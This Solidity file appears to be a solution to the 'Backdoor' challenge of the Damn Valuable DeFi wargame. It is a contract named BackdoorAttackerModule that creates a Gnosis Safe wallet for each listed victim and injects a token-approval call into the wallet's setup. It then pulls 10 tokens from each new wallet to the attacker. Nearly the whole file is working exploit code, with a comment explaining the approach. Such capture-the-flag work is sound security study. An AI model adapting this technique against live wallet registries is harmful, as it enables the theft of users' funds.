// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/base/ModuleManager.sol";
import "../backdoor/WalletRegistry.sol";
import "../DamnValuableToken.sol";

contract BackdoorAttackerModule is ModuleManager{
  GnosisSafeProxyFactory public proxyfactory;
  GnosisSafe public mastercopy;
  WalletRegistry public walletregistry;
  address public dvt;


  constructor (address _factory, address payable _masterCopy, address _walletRegistry, address _dvt)  {
    proxyfactory = GnosisSafeProxyFactory(_factory);
    mastercopy = GnosisSafe(_masterCopy);
    walletregistry = WalletRegistry(_walletRegistry);
    dvt = _dvt;
  }
  /*@dev
    Initially wanted to perform the attack using the execTransactionFromModule function from Gnosis's ModuleManager, but because of the authorized modifier on enableModule(), there was much added complexity to the logic of the attack. A more simple way ended up to pass the ERC20 approval() function as the initial callback data to the proxy creation, which allows us to call transferFrom() and receive all the tokens the proxy received upon creation.
    */


  function setupManager(address _token, address payable _addressattackerModule) public {
    DamnValuableToken(_token).approve(_addressattackerModule, 10 ether);
  }


  function attack(address[] memory _users, address _to, address payable _attacker, bytes memory _initialData) public {
    for (uint256 i = 0; i < _users.length; i++) {
      address victim = _users[i];
      address[] memory userArray = new address[](1);
      userArray[0] = victim;

      bytes memory _initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)", userArray, uint256(1), address(this), _initialData, address(0), address(0), uint256(0), address(0));

      GnosisSafeProxy proxy = proxyfactory.createProxyWithCallback(
        address(mastercopy),
        _initializer,
        0,
        IProxyCreationCallback(address(walletregistry))
      );
    
    
    DamnValuableToken(dvt).transferFrom(address(proxy), _attacker, 10 ether);
    }
  }
    

}

